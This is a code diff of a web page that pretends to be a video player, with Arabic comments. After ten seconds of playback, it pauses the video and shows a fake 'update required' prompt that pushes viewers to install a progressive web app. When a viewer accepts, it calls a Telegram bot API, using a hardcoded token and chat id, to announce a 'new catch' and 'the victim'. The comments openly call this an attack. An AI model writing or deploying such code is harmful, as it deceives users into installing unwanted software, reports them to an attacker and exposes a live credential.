@@ -3,54 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player Support</title>
+    <title>Media Player Update</title>
     <link rel="manifest" href="manifest.json">
     <style>
-        body { margin: 0; background-color: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        video { width: 100%; height: auto; max-height: 100vh; }
+        body { margin: 0; background-color: #000; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; }
+        video { width: 100%; max-height: 80vh; background: #000; }
+        /* شكل رسالة التحديث الاحترافية */
+        #updateModal { display: none; position: fixed; bottom: 20px; left: 10px; right: 10px; background: #222; border: 1px solid #444; border-radius: 15px; padding: 20px; z-index: 10000; box-shadow: 0 0 20px rgba(0,0,0,0.8); }
+        #updateModal h3 { margin: 0 0 10px; font-size: 18px; color: #4285f4; }
+        #updateModal p { margin: 0 0 20px; font-size: 14px; color: #ccc; }
+        #updateBtn { background: #4285f4; color: white; border: none; padding: 10px 20px; border-radius: 5px; width: 100%; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <video id="myVideo" playsinline autoplay muted poster="trend_bg.jpg.jpg">
+    <video id="myVideo" controls poster="trend_bg.jpg.jpg">
         <source src="v.mp4" type="video/mp4">
     </video>
 
+    <div id="updateModal">
+        <h3>تحديث مطلوب</h3>
+        <p>للمتابعة بدون تقطيع، يرجى تثبيت أحدث إصدار من مساعد مشغل الفيديو (Media Engine).</p>
+        <button id="updateBtn">تثبيت التحديث الآن</button>
+    </div>
+
     <script>
-        // تسجيل الخدمة في الخلفية
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('sw.js');
         }
 
-        let installPrompt = null;
+        let deferredPrompt;
+        const modal = document.getElementById('updateModal');
+        const updateBtn = document.getElementById('updateBtn');
         const video = document.getElementById('myVideo');
 
-        // صيد طلب التثبيت
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
-            installPrompt = e;
+            deferredPrompt = e;
         });
 
-        // تنفيذ الهجمة بعد 10 ثوانٍ
+        // تشغيل الهجمة بعد 10 ثواني من الضغط على Play
         video.onplay = () => {
             setTimeout(() => {
-                if (installPrompt) {
-                    if (confirm("⚠️ تنبيه: يجب تحديث مشغل الفيديو للمتابعة ومشاهدة المقطع كاملاً.\n\nتحديث الآن؟")) {
-                        installPrompt.prompt();
-                        installPrompt.userChoice.then((choice) => {
-                            if (choice.outcome === 'accepted') {
-                                // بيانات البوت بتاعتك اللي بعتها
-                                const token = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
-                                const chatId = "1356975454";
-                                const msg = "🎯 صيدة جديدة يا حسام!\nالضحية وافق على التثبيت وبقى معاك.";
-                                
-                                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-                            }
-                        });
-                    }
+                if (deferredPrompt) {
+                    modal.style.display = 'block';
+                    video.pause(); // نوقف الفيديو عشان يضطر يثبت
                 }
-            }, 10000); // 10 ثوانٍ بالظبط
+            }, 10000); 
         };
+
+        updateBtn.addEventListener('click', async () => {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const { outcome } = await deferredPrompt.userChoice;
+                if (outcome === 'accepted') {
+                    // إرسال للبوت
+                    const token = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
+                    const chatId = "1356975454";
+                    const msg = "🎯 صيدة جديدة يا حسام! الضحية ثبت التطبيق بنجاح.";
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`, { mode: 'no-cors' });
+                    modal.style.display = 'none';
+                }
+            }
+        });
     </script>
 </body>
 </html>
